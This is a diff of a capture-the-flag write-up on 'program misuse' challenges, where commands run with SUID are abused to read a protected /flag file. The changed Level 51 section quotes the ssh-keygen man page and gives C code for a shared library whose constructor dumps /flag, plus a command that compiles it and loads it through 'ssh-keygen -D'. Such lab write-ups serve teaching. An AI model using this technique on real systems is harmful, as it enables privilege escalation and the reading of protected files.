@@ -1,4 +1,8 @@
-# Fundamentals 
+<center>
+    <h1 style="color: green;">
+Program misuse
+    </h1> 
+</center>
 
 Most of these challenges can be solved with one liners, thus I will showcase the solutions below. I will not go into much details, the program runs the given commands with `SUID`. The purpose is for players to understand how the commands work. To getter a better understanding of each command, run on command line `man func_name`, e.g. `man cat`. Always run the given executable at `/challenge` to set the `sticky bit` to each command.
 
@@ -549,11 +553,14 @@ cat /flag
 
 ### Level 51 - ssh-keygen
 
-```bash
-gcc -shared -o w3t.so -fPIC w3t.c
-```
+First we need to create a `.c` file and then compile it to an `.so` shared library. We do that because we can exploit that challenge via `ssh-keygen -D`. From the `man` page of `ssh-keygen`:
 
-
+>     -D pkcs11
+>                  Download the public keys provided by the PKCS#11 shared library pkcs11.  When used in combination with -s, this option indicates that a CA key resides in a PKCS#11 token (see the CERTIFICATES section for details).
+>     
+>     It is possible to sign using a CA key stored in a PKCS#11 token by providing the token library using -D and identifying the CA key by providing its public half as an argument to -s:
+>     
+>            $ ssh-keygen -s ca_key.pub -D libpkcs11.so -I key_id user_key.pub
 
 ```c
 #include <stdio.h>
@@ -561,8 +568,12 @@ gcc -shared -o w3t.so -fPIC w3t.c
 #include <unistd.h>
 
 __attribute__((constructor))
-void w3t() { sendfile(1,open("/flag",0),0,4096); } 
+void C_GetFunctionList() { sendfile(1, open("/flag", 0), 0, 4096); }
 ```
 
+Now, we need to compile the program to `.so` and then perform the `ssh-keygen -D`.
 
+```bash
+$ gcc -shared -o w3t.so w3t.c && ssh-keygen -D ./w3t.so
+```
 
